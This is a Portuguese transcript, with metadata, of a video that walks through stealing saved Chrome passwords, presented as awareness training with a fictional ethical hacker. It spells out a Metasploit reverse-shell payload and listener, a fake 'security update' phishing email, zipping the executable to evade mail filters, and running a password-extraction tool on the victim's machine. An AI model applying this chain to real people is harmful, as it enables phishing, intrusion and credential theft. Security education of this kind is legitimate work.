@@ -1,0 +1,138 @@
+---
+video_title: "How Hackers Hack Chrome Passwords"
+video_id: Gy2bAcMD3bs
+channel_name: "Neurix"
+channel_id: UCUOlY1VUTHMdkLph5ORHF2Q
+channel_category: "Science & Technology"
+url: https://www.youtube.com/watch?v=Gy2bAcMD3bs
+video_date: 2026-03-13T12:04:43+00:00
+video_description: |
+  Letting Chrome save passwords feels safe, until a hacker turns that convenience into a treasure chest.
+  
+  This video is for educational and awareness purposes only. The goal is to show how browser password theft works so you can better protect yourself.
+  
+  ▬▬ Tools Used ▬▬
+  - Kali Linux: Attacker OS
+  - Windows 10: Victim  OS
+  - ChromeLevator:  Password extraction
+  - Metasploit: Payload generation & reverse shell
+  
+  ▬▬ ⏱️ Chapters ▬▬
+  00:00  Prologue: Sally's Digital Life
+  01:53  How Chrome Actually Saves Passwords
+  03:08  Creating the Trojan
+  04:49  Setting Up the  Listener
+  06:27  The Phishing Email
+  09:25  Extracting Passwords 
+  14:49  Chrome Passwords Hacked!
+  
+  Join Neurix to get access to perks:
+  https://www.youtube.com/channel/UCUOlY1VUTHMdkLph5ORHF2Q/join
+  
+  #penetrationtesting #chrome #cybersecurity
+---
+Esta é a Sally. Ela é uma artista que passa os dias dando vida a belas paisagens em suas pinturas. Mas, como a maioria de nós, ela também vive uma vida digital. Ela verifica e-mails, faz compras online, paga contas e conversa com amigos, tudo através de seu confiável laptop com Windows. Vejamos o dia de hoje, por exemplo.
+
+Sally quer verificar seu e-mail. Ela abre o navegador e acessa o ProtonMail, um serviço que escolheu especificamente por se preocupar com privacidade e segurança. Ela digita seu e-mail, sallytrial@proton.me, e depois sua senha, mycat2027!@#.
+
+Uma senha forte, com letras maiúsculas, minúsculas, números, caracteres especiais, tudo de bom. Sally sorri, pensando: "Nenhum hacker jamais encontrará esta." Ela clica em "Entrar" e, pronto, está dentro. Mas aí o Chrome faz o que o Chrome sempre faz. Uma pequena mensagem aparece na parte superior da tela.
+
+A mensagem pede para salvar a senha e o nome de usuário deste site. Sally mal olha para aquilo. Ela clicou em salvar sem pensar duas vezes. Essa é uma funcionalidade bacana do Chrome. Na próxima vez que ela quiser entrar, não precisará digitar a senha novamente.
+
+Em seguida, Sally visita sua loja online favorita , demoblaze.com. Ela clica em "Entrar" e insere suas credenciais. O nome de usuário dela é sally7780. E a senha dela é coffee@42#.
+
+Ela clica em "Entrar". O Chrome pergunta novamente: "Salvar senha para demoblaze.com?" Ela clica em salvar. É conveniente, não é?
+
+O navegador se lembra disso por ela. Chega de digitar aquela senha enorme toda vez. É seguro, ela pensa. Mas eis a verdade incômoda que Sally, e a maioria das pessoas, não percebem. Ao clicar em "Salvar senha" no Chrome, Edge ou Firefox, você não está armazenando essa senha em um cofre impenetrável.
+
+Você está armazenando isso em um arquivo no seu computador. Sim, está criptografado [a música], mas a chave para descriptografá-lo está aí mesmo, no seu computador, vinculada ao seu login do Windows. E se um invasor conseguir acesso, mesmo que remoto, à sua máquina, esse arquivo se torna um verdadeiro tesouro à espera de ser aberto. [música] Todas as senhas, todos os cookies, todos os números de cartão de crédito salvos serão expostos. E é aí que Kim entra em cena.
+
+Ele é um especialista em testes de penetração e hacker ético. O papel dele é invadir sistemas com permissão, para que ele possa mostrar a pessoas como Sally onde a segurança delas falha antes que os verdadeiros criminosos descubram. Hoje, Kim não está interessada na arte de Sally . Ele está interessado em algo muito mais valioso: a identidade digital dela. Cada senha que Sally já salvou em seu navegador é como uma chave para toda a sua vida online.
+
+O e-mail dela, as contas de compras, talvez até mesmo o saldo bancário. E hoje, Kim vai roubar cada um deles de forma ética. Agora, vamos ver como Kim rouba a senha de Sally, que estava salva no Chrome. Primeiro, Kim precisa de uma brecha. Ele vai criar o que é chamado de carga útil de blindagem reversa.
+
+Este é um pequeno programa que, quando executado no computador de Sally, se conecta ao computador de Kim e lhe dá acesso remoto. Para isso, Kim abre um terminal em sua máquina Kali Linux e digita msfvenom -p windows/x64/meterpreter/reverse_tcp.
+
+Isso gera uma carga útil TCP reversa Meterpreter de 64 bits, que pode ser usada para estabelecer uma conexão remota com um sistema alvo. Em seguida, ele precisa especificar LHOST. Este é o endereço IP de uma máquina que ele controla. É aqui que o computador de Sally se conectará novamente. Kim abre um novo terminal e digita IPA para encontrar seu endereço IP.
+
+Ele vê 192.168.122.71
+
+e usa esse valor como seu LHOST. Em seguida vem o LPORT. Esta é a porta que o computador de Kim usará para aguardar a conexão de entrada. Ele escolhe a porta 4444, uma porta comum para esse tipo de ataque. Por fim, ele adiciona -fx para especificar o formato de saída como um executável do Windows.
+
+E -o updater.exe para nomear o arquivo. E é isso. O comando completo está pronto. Quando Kim pressionar Enter, isso criará o arquivo updater.exe, que parece inofensivo, mas
+
+dará a Kim acesso remoto total no momento em que Sally o executar. Kim pressiona Enter. E assim, sem mais nem menos, ele agora tem sua arma. Agora ele só precisa que Sally administre isso. Ele vai enviar para ela por e-mail.
+
+Quando Sally clicar, um túnel se abrirá de volta para Kim. Mas como Kim ouve isso? Ele precisa estar atento a essa conexão, esperando que Sally faça a chamada. Para isso, ele utiliza o console do Metasploit Framework. Ele inicia o programa e o console do Metasploit é carregado.
+
+Agora Kim precisa configurar o ouvinte. Pense nisso como configurar um walkie-talkie no canal certo. Ele digita use exploit/multi/handler. Este comando instrui o Metasploit a ativar um módulo projetado para interceptar conexões de entrada. Essencialmente, transforma a máquina dele em um receptor.
+
+Em seguida, ele digita set payload windows/x64/meterpreter/reverse_tcp.
+
+Isso indica ao receptor exatamente que tipo de sinal esperar. Tem que corresponder à carga útil que ele incluiu no updater.exe, como garantir que dois rádios comunicadores estejam na mesma frequência. Em seguida, ele configura seu endereço IP com o comando set LHOST 192.168.122.71.
+
+Isso indica ao ouvinte qual porta de rede ele deve monitorar. Ele configura a porta com o comando `set LPORT 4444`. Pense nisso como o canal específico no rádio comunicador. Finalmente, ele digita "exploit". Isso ativa o ouvinte.
+
+O terminal responde, iniciou o manipulador TCP reverso em 192.168.1.105:4444.
+
+Kim recosta-se à espera. A armadilha está armada. Agora ele só precisa que Sally morda a isca. Agora ele pode redigir um e-mail para Sally contendo a informação valiosa. O e-mail diz: "Prezado(a) usuário(a), [música], detectamos que seu sistema está desatualizado e requer uma atualização de segurança imediata .
+
+Para concluir esta atualização, faça o download do arquivo em anexo e execute o instalador de atualização em seu dispositivo. A atualização levará apenas alguns minutos para ser instalada. Esta atualização é essencial para o desempenho e a segurança contínuos do seu sistema. Atenciosamente, equipe de suporte." Agora vem a parte final e mais importante .
+
+Kim precisa anexar o arquivo updater.x ao e-mail. Mas existe um problema. A maioria dos provedores de e-mail bloqueia arquivos .x por completo.
+
+Eles sabem que arquivos executáveis ​​são perigosos. Então Kim vai fechar o zíper antes de enviar. Fechar o zíper faz duas coisas. Ele comprime o arquivo, mas, mais importante, envolve a extensão .x em um contêiner que parece menos suspeito para os filtros de e-mail.
+
+Para compactar o arquivo, Kim volta ao terminal e digita zip updater.zip updater.x. Este comando pega o arquivo updater.x e o compacta em um novo arquivo chamado updater.zip.
+
+Kim pressiona Enter. O arquivo zip foi criado. O e-mail dele sobre pesca está pronto para ser enviado. Agora ele pode voltar ao ProtonMail e anexar o arquivo zip. Ele clica no ícone de anexos e seleciona o arquivo updater.zip.
+
+E pronto. O envio de e-mails de phishing foi concluído. Ele clica em enviar. Após alguns segundos, o e-mail está a caminho de Sally. Agora, basta um clique da Sally e ele entra.
+
+Enquanto isso, Sally checa seus e-mails. Há uma mensagem que parece ser da equipe de suporte do Windows. O assunto do e-mail alerta para uma atualização crítica. O e-mail diz que ela deve executar o anexo imediatamente para proteger seu computador. Ela não pensa duas vezes.
+
+Ela baixa o arquivo, abre-o e depois extrai o conteúdo do arquivo zip. E aqui está ele, o Trojan updater.exe do Kim Center. Disfarça-se de algo legítimo enquanto esconde seu verdadeiro propósito. Sally clica duas vezes, pensando que se trata de uma atualização de segurança genuína da Microsoft.
+
+Parece que nada acontece. Mas, na realidade, algo enorme aconteceu nos bastidores. Na tela de Kim, o terminal explode em atividade. O computador de Sally se conectou à máquina de Kim pela internet . O túnel já está aberto. O
+
+computador de Sally não é mais só dela, agora é deles. A tela de Kim exibe a mensagem " sessão meterpreter um aberta". Boom. Kim está dentro. Ele agora tem um shell Meterpreter na máquina Windows da Sally.
+
+Isto não é apenas um prompt de comando. Esta é uma das ferramentas de pós-exploração mais poderosas que existem. Agora que Kim tem acesso, ele precisa se orientar. Primeiro, ele verifica com qual usuário está executando o programa . Para isso, ele digita "obter UID".
+
+A saída é: nome de usuário do servidor desktop barra invertida Sally. Ele conta para Kim que está se passando pela própria Sally, o que significa que ele tem todo o acesso que Sally tem. Em seguida, ele verifica em qual sistema está utilizando o comando sysinfo. Ele consegue ver que o computador de Sally está executando o Windows 10 com arquitetura de 64 bits . Agora, é aqui que as coisas ficam interessantes.
+
+Como Kim já está logado como Sally através da sessão Meterpreter que ele estabeleceu, ele poderia localizar manualmente o arquivo contendo as senhas criptografadas do Chrome de Sally , encontrar a chave de descriptografia, que, como explicado anteriormente, está vinculada à sua conta de usuário do Windows, e escrever scripts personalizados para descriptografar as senhas. Mas esse processo também é tedioso, demorado e propenso a erros. Na verdade, por que reinventar a roda quando existe uma ferramenta criada especificamente para isso? Essa ferramenta se chama Chrome Elevator. O Chrome Elevator é uma ferramenta moderna de código aberto projetada com um único propósito: extrair senhas armazenadas em uma máquina comprometida.
+
+Ele extrai senhas, cookies, cartões de crédito e tokens de sessão automaticamente. Primeiro, Kim precisa instalar o Chrome Elevator na máquina da Sally. Para fazer isso [com a música], ele primeiro a baixa. Ele volta ao navegador e pesquisa por "Chrome Elevator". O primeiro resultado é a página oficial do GitHub . Ele clica.
+
+Abre-se uma página do GitHub para o projeto Chrome Elevator. Nessa página, ele procura a seção de lançamentos e abre a página de lançamentos. Lá, ele rola a página para baixo e encontra o arquivo chrome-dash-injector.zip. Este é o arquivo que contém a ferramenta que irá descriptografar as senhas de Sally.
+
+Ele faz o download. Em seguida, ele navega até a pasta de downloads para verificar o download. Como você pode ver na pasta de downloads dele, há um novo arquivo, chrome-injector.zip. Ele descompacta o arquivo usando o comando unzip.
+
+E aqui está. Ele recebe dois novos arquivos, chrome-elevator-x64.x para sistemas de 64 bits e Chrome Elevator arm64.x para dispositivos baseados em arm64. O Chrome Elevator x64.x é o que Kim
+
+precisa, já que ele confirmou anteriormente com o comando sysinfo que a máquina de Sally está executando uma arquitetura de 64 bits. Agora que ele tem o arquivo, pode enviá- lo diretamente para o computador da Sally através do Meterpreter. Para isso, ele digita o comando upload seguido do caminho para o arquivo Chrome Elevator x64.x. Em seguida, ele especifica o caminho de destino no computador de Sally onde deseja enviar o arquivo, que é o diretório temporário, um local de ocultação comum que não levanta suspeitas.
+
+Ele aperta Enter. E pronto, o upload está completo. Agora que o arquivo Chrome Elevator x64.exe está no computador da Sally, Kim precisa executá-lo lá. Para isso, ele precisa de um prompt de comando padrão do Windows no computador de Sally. É
+
+exatamente isso que o comando do shell fornece. Ele digita "shell" e pressiona Enter. Instantaneamente, ele é inserido na linha de comando de Sally. Uma vez dentro do shell, ele pode usar os comandos padrão do Windows. Por exemplo, ele pode usar o comando de mudança de diretório para navegar até a pasta temporária de Sally.
+
+Lembre-se, foi aqui que ele carregou o arquivo Chrome Elevator.x. Agora que Kim está na pasta temporária de Sally, ele pode usar o comando dir para listar o conteúdo e verificar se o executável do Chrome Elevator realmente foi instalado lá. E pronto, o arquivo está lá. O upload foi concluído com sucesso.
+
+A ferramenta está pronta. Agora, tudo o que Kim precisa fazer é executar o plano. Para executar o Chrome Elevator, Kim digita Chrome Elevator x64.x chrome-o sallydata. Vamos analisar o que esse comando faz.
+
+Chrome Elevator x64.x é o nome exato do executável do Chrome Elevator que Kim carregou no computador de Sally. O Chrome instrui o Chrome Elevator a direcionar especificamente o Chrome, em vez do Firefox ou do Brave, por exemplo. O parâmetro `dash o sally` especifica o diretório de saída onde os resultados serão salvos. Os dados de Sally são o nome da pasta.
+
+É aqui que os dados extraídos serão armazenados. Kim pressiona Enter. Durante alguns segundos, a ferramenta faz sua mágica. Injetando código no processo do Chrome, burlando a criptografia e extraindo tudo o que Sally já salvou. Então, bum!
+
+Os resultados aparecem. Foram encontrados 18 cookies e duas senhas. [música] A vida digital de Sally agora está organizada e pronta para ser explorada por Kim. Analisando mais atentamente, podemos ver que o Chrome Lovator salvou automaticamente os resultados em uma nova pasta chamada Chrome, localizada dentro da pasta de dados da Sally. Antes de acessar os dados de Sally, Kim digita "exit" para sair da janela do Windows e retornar ao monitor.
+
+Isso ocorre porque o espaço disponível no ambiente Windows é limitado. O Meter Preeder oferece um conjunto muito mais rico de comandos de arquivo. Por exemplo, o comando PWD, que revela o diretório de trabalho atual de uma forma muito mais clara e consistente do que o shell do Windows. Enquanto Kim navega pelos dados de Sally, ele encontra a pasta do Chrome criada pelo Chrome Lovator. Ele entra.
+
+Lá dentro, ele encontra uma pasta chamada "default". Este é o perfil padrão do Chrome no computador da Sally. Kim aprofunda a investigação. Um rápido comando LS revela o que ele está procurando. Dois arquivos, cookies.json e
+
+passwords.json. Tudo o que Sally confiou ao Chrome para manter em segurança agora está armazenado nesses dois arquivos. E Kim tem acesso total. Ele executa o comando cat para abrir o arquivo passwords.json.
+
+E aqui está. As credenciais de Sally foram expostas. Kim consegue ver os URLs dos sites para os quais o Chrome salvou senhas, juntamente com os nomes de usuário correspondentes e as próprias senhas em texto simples. A senha que Sally considerava segura agora está bem na tela de Kim, pronta para ser explorada. E isso é tudo por hoje.
+
+Se você gostou deste vídeo, dê um like, inscreva-se para mais conteúdo e não salve senhas no navegador. Bye Bye.
